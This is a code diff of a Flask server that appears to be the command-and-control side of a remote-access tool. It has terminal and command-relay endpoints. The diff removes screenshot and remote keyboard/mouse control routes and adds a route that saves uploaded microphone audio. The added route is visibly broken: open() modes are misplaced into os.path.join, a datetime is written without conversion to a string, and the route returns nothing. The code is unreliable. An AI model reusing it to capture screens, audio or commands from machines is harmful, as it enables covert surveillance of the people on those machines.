@@ -427,47 +427,6 @@ def clear():
 def screen():
 	return render_template("screen.html")    
 
-@app.route("/screenshot",methods=["GET","POST"])
-def screenshot():
-	global image
-	if request.method == "GET":
-		if image:
-			return Response(image, mimetype="image/jpeg")
-	if request.method == "POST":
-		image = request.data
-	return "done"
-	
-@app.route("/control", methods=["GET", "POST"])
-def control():
-    global control_data
-    if request.method == "POST":
-        data = request.get_json()
-        if data["type"] == "key":
-            control_data["type"] = "key"
-            control_data["btn"] = data["button"]
-        elif data["type"] == "click":
-            control_data["type"] = "mouse"
-            control_data["x"] = data["x"]
-            control_data["y"] = data["y"]
-            control_data["mouse"] = data["button"]
-            control_data["width"] = data["width"]
-            control_data["height"] = data["height"]
-        elif data["type"] == "scroll":
-            control_data["type"] = "scroll"
-            control_data["deltaY"] = data["deltaY"]
-        elif data["type"] == "dbclick":
-            control_data["type"] = "dbclick"
-            control_data["x"] = data["x"]
-            control_data["y"] = data["y"]
-            control_data["width"] = data["width"]
-            control_data["height"] = data["height"]
-        return "done"
-
-    if request.method == "GET":
-        data1 = control_data
-        control_data = {}      
-        return jsonify(data1)             
-        
 @app.route("/terminal",methods=["GET", "POST"])
 def terminal():
     global output
@@ -525,5 +484,13 @@ def cmd():
 		with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
 			file.write(command)
 	return "done"
+	
+@app.route("/audio",methods=["GET","POST"])
+def audio():
+	if request.method == "POST":
+		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav","wb")) as file:
+			file.write(request.data)
+		with open(os.path.join(STATIC_FOLDER,"mic","time.txt","w")) as file:
+			file.write(datetime.now())		
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
